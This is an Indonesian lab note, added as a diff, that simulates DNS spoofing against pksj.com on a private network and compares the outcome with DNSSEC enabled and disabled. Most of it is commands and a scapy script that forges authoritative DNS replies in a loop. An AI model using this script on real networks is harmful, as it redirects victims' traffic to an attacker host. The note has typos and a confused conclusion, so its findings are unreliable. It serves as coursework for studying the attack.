@@ -1,0 +1,30 @@
+Melakukan simulasi serangan DNS spoofing menggunakan IP yang ada didalam db.pksj.com untuk menyerang IP yang akan disiapkan untuk diserang
+
+(untuk menginstall tiga alat penting yang yang bia digunakan untuk fungsi terkait DNS)
+sudo apt update
+sudo apt install dnsutils tcpdump scapy
+ip a (untuk pengecekan nama antarmuka sistem)
+sudo tcpdump -i enp0s3 port 53 -vv (menangkap lalu lintas DNS)
+sudo phython3 (memanipulasi jaringan)
+(masukkan skrip untuk melakukan serangan DNS spoofing)
+>>> from scapy.all import *
+t>>>
+>>> target_ip = "192.168.1.125"
+>>> dns_server = "192.168.1.1"
+>>> spoofed_ip = "192.168.1.32"
+>>> domain = "pksj.com"
+>>>
+>>> dns_response = IP(src=dns_server, dst=target_ip)/\
+... UDP (sport=53, dport=RandShort())/\
+... DNS(id=RandShort(), qr=1, aa=1, qd=DNSQR(qname=domain), an=DNSRR(rrname=domain, rdata=spoofed_ip))
+>>>
+>>> send(dns_response, loop=1, verbose=1)
+
+(melakukan pengujian respon server DNS dengan DNSSEC aktif)
+dig +dnssec pksj.com
+
+(memeriksa log server dns untuk memastikan dnssec bisa mendeteksi adanya manipulasi)
+sudo tail -f /var/log/syslog
+
+(melakukan perbandingan pada serangan DNS Spoofing saat DNSSEC aktif dan DNSSEC non-aktif)
+(Perbedaan serangan dns spoofing saat dnsssec aktif setelah mengirimkan script yang dikirimkan akan memberikan respon bahwa script yang dikirimkan berhasil dan serangan dns spoofing saat dnssec non-aktif akan memberikan respon warning).
